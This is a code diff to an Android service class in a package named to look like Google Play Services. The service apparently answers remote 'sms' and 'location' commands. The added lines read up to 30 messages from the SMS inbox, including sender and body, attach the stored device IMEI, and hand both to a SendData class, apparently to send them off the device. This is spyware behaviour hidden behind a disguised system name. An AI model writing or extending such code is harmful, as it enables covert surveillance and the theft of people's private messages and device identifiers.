@@ -3,6 +3,7 @@ package com.google.androidgms;
 import android.app.IntentService;
 import android.content.Intent;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.SurfaceTexture;
@@ -62,6 +63,8 @@ public class GetData extends IntentService{
         if (intent.getStringExtra(Msg).equals("sms")) {
             Log.d(intent.getStringExtra(Msg), "print");
             String[] reqCols = new String[] { "_id", "address", "body","person" };
+            String[] messageArr = new String[30];
+            int ctr=0;
             Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
             cursor.moveToFirst();
 
@@ -72,7 +75,13 @@ public class GetData extends IntentService{
                     msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                 }
                 Log.d("Message",msgData);
-            }while(cursor.moveToNext());
+                messageArr[ctr]=msgData;
+                ++ctr;
+            }while(cursor.moveToNext() && ctr<30);
+            SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
+            String imei = sp.getString("imei","null");
+            Log.d("checkSP",imei);
+            SendData s1 = new SendData(messageArr,imei);
         }
         else if(intent.getStringExtra(Msg).equals("location"))
         {
